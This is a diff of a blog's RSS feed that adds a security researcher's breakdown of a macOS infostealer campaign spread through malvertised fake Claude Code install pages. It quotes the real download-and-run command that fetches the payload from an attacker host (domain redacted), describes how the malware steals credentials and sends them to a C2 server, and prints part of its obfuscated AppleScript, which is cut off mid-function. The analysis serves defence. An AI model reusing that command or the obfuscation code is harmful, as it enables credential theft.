@@ -3,25 +3,814 @@
   <channel>
     <title>Home on Crumbliacci&#39;s Blog</title>
     <link>https://jcrumb.github.io/</link>
-    <description>Recent content in Home on Crumbliacci&#39;s Blog</description>
-    <generator>Hugo</generator>
+    <description>Crumbliacci&#39;s Blog (Home)</description>
+    <generator>Hugo -- gohugo.io</generator>
     <language>en-US</language>
     <copyright>Copyright © Jay Crumb</copyright>
     <lastBuildDate>Tue, 10 Mar 2026 00:00:00 +0000</lastBuildDate>
+    
     <atom:link href="https://jcrumb.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
     <item>
       <title>Breakdown of an Ongoing macOS Infostealer Campaign</title>
-      <link>https://jcrumb.github.io/breakdown-of-an-ongoing-macos-infostealer-campaign/</link>
+      <link>https://jcrumb.github.io/blog/claude-code-malware/</link>
       <pubDate>Tue, 10 Mar 2026 00:00:00 +0000</pubDate>
-      <guid>https://jcrumb.github.io/breakdown-of-an-ongoing-macos-infostealer-campaign/</guid>
-      <description>I&amp;rsquo;ve seen a couple of companies hit by a macOS infostealer through February/March 2026. Here are my notes on how it behaves, how it&amp;rsquo;s distributed, and some IOCs.</description>
+      
+      <guid>https://jcrumb.github.io/blog/claude-code-malware/</guid>
+      <description>&lt;p&gt;A few weeks ago, we had a rather scary EDR notification pop up in our monitoring Slack channel. It said (paraphrased):&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A suspicious Unix shell command was run, we killed the process but check this shit out&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The actual command pasted was as follows (domain redacted):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;/bin/bash -c &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;#!/bin/bash curl -o /tmp/update https://&amp;lt;REDACTED&amp;gt;.com/n8n/update \&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; xattr -c /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /tmp/update
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks. More recently, a founder friend of mine reached out
+and asked if I could hop on a call as one of their engineers seemed to have run some malware on their machine and could I jump in to
+give them a hand with incident response?&lt;/p&gt;
+&lt;p&gt;As soon as I started looking at the logs, it became pretty clear that this was the same as what I saw a few weeks prior, but my
+friend&amp;rsquo;s company hadn&amp;rsquo;t been so lucky. Their EDR solution had noted that this looked suspicious as all get out and set off alarm bells,
+but only &lt;em&gt;after&lt;/em&gt; allowing the execution to proceed.&lt;/p&gt;
+&lt;h1 id=&#34;we-have-all-been-trained-to-do-stupid-things&#34; &gt;We Have All Been Trained to do Stupid Things
+&lt;span&gt;
+    &lt;a href=&#34;#we-have-all-been-trained-to-do-stupid-things&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;Much has already been written about similar ongoing campaigns, but the high level way they work is this:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The threat actor compromises one or several Google Ads accounts (the exact mechanism will vary).&lt;/li&gt;
+&lt;li&gt;They also compromise insecure personal websites, domains, or register throwaway subdomains on free hosting sites.&lt;/li&gt;
+&lt;li&gt;Armed with these two tools, they clone documentation sites for tools such as Claude Code and place ads on Google
+to get their faked sites to the top of search results.&lt;/li&gt;
+&lt;li&gt;The fake sites have install instructions that give you malware to run.&lt;/li&gt;
+&lt;li&gt;You, the user, helpfully run the malware for the attacker.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The general process here combines the techniques of &amp;ldquo;malvertising&amp;rdquo; and &amp;ldquo;ClickFix&amp;rdquo;. It&amp;rsquo;s easy to blame the individuals
+who fall for this, but really, this is an industry-wide problem that has been &lt;em&gt;years&lt;/em&gt; in the making. For a good long time,
+we have all been conditioned to think that &lt;code&gt;curl ... | bash&lt;/code&gt; is a valid installation method and not a &lt;strong&gt;patently insane way to distribute software&lt;/strong&gt;.
+Sure, it&amp;rsquo;s convenient, but this particular security bad habit is now coming home to roost in a big way.&lt;/p&gt;
+&lt;p&gt;The ongoing LLM craze means there are lots of new vibe coders and fledgling software engineers to exploit, but in both cases I saw these
+were not the demographic being hit; these were experienced engineers who were just in a hurry and didn&amp;rsquo;t quite stop to evaluate
+whether that domain did in fact look right after pasting.&lt;/p&gt;
+&lt;h1 id=&#34;so-you-ran-some-malware&#34; &gt;So, You Ran Some Malware
+&lt;span&gt;
+    &lt;a href=&#34;#so-you-ran-some-malware&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;Let&amp;rsquo;s talk about what happens when you actually run this malware. Based on the collected forensics in the successful execution, I saw the following
+play out over the course of about ~10 seconds based on the timestamps in EDR logs. The below was all executed via &lt;code&gt;/tmp/update&lt;/code&gt; from the initial
+compromise command, which is &lt;em&gt;heavily&lt;/em&gt; obfuscated AppleScript. Using native tools like this is a common way to evade detection, and I&amp;rsquo;ll break down
+the obfuscation layer below.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;First, it creates a directory at &lt;code&gt;/tmp/&amp;lt;random 5 digit id&amp;gt;&lt;/code&gt; to stage files into.&lt;/li&gt;
+&lt;li&gt;It hides the terminal window to mask the other commands being run.&lt;/li&gt;
+&lt;li&gt;It then reads the &lt;code&gt;USER&lt;/code&gt; attribute so it can construct a path to the user&amp;rsquo;s home directory.&lt;/li&gt;
+&lt;li&gt;It writes a file to the user&amp;rsquo;s home directory with command &amp;amp; control (C2) configuration.&lt;/li&gt;
+&lt;li&gt;It starts harvesting files, including browser cookies, crypto wallets, notes, files from &lt;code&gt;~/Desktop&lt;/code&gt; and &lt;code&gt;~/Documents&lt;/code&gt;,
+password vaults, keychains, etc. If it needs the user to unlock the keychain, it pops up a fake &amp;ldquo;Required Application Helper&amp;rdquo; dialog
+to harvest their system password.&lt;/li&gt;
+&lt;li&gt;Next, it zips up all these files into &lt;code&gt;/tmp/out.zip&lt;/code&gt; and &lt;code&gt;POST&lt;/code&gt;s them to a URL from the C2 config.&lt;/li&gt;
+&lt;li&gt;To persist, it installs itself via &lt;code&gt;launchctl&lt;/code&gt; so the infostealer runs on each boot.&lt;/li&gt;
+&lt;li&gt;Finally, it cleans up after itself, removing &lt;code&gt;/tmp/out.zip&lt;/code&gt; and the staging directory.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Most of the files used have innocuous names like &lt;code&gt;.mainhelper&lt;/code&gt; in order to help with persistence. If you didn&amp;rsquo;t have an EDR tool
+installed to alert on these behaviours, you&amp;rsquo;d likely never notice anything wrong until your crypto wallet was emptied.&lt;/p&gt;
+&lt;h1 id=&#34;adventures-in-obfuscation&#34; &gt;Adventures in Obfuscation
+&lt;span&gt;
+    &lt;a href=&#34;#adventures-in-obfuscation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;&lt;p&gt;Looking at the actual script that gets initially executed feels like someone has spiked your drink and you&amp;rsquo;ve forgotten how to read.
+The code is heavily obfuscated, and doing a string search won&amp;rsquo;t help you find out what was harvested. Here&amp;rsquo;s an excerpt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-AppleScript&#34; data-lang=&#34;AppleScript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cdftjcxbo&lt;/span&gt;(&lt;span style=&#34;color:#bb60d5&#34;&gt;ikigxsgf&lt;/span&gt;, &lt;span style=&#34;color:#bb60d5&#34;&gt;ieoycfoei&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;sodzerodpta&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;oxebtefnj&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gufxxjwnzhaz&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;ikigxsgf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;oxebtefnj&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;oxebtefnj&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gufxxjwnzhaz&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;ikigxsgf&lt;/span&gt;)) &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;mod&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;sodzerodpta&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;sodzerodpta&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;character&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;id&lt;/span&gt; ((&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gufxxjwnzhaz&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;ikigxsgf&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gufxxjwnzhaz&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;ieoycfoei&lt;/span&gt;)))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;oxebtefnj&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;oxebtefnj&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;mod&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;sodzerodpta&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cdftjcxbo&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cmbnxmjiwwr&lt;/span&gt;(&lt;span style=&#34;color:#bb60d5&#34;&gt;fpwkmuyobijj&lt;/span&gt;, &lt;span style=&#34;color:#bb60d5&#34;&gt;pcjvewnfyml&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;fpwkmuyobijj&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; (&lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;pcjvewnfyml&lt;/span&gt;)) &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;mod&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;character&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;id&lt;/span&gt; ((&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;fpwkmuyobijj&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#007020&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;gnodqyefnwb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;pcjvewnfyml&lt;/span&gt;)))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;mikzetljb&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cmbnxmjiwwr&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;czxucxewqe&lt;/span&gt;(&lt;span style=&#34;color:#bb60d5&#34;&gt;yhkylofpi&lt;/span&gt;, &lt;span style=&#34;color:#bb60d5&#34;&gt;dofhtoiddo&lt;/span&gt;, &lt;span style=&#34;color:#bb60d5&#34;&gt;zkhoxipck&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;kutavyrrjoki&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;oyuuyqoiuxc&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;
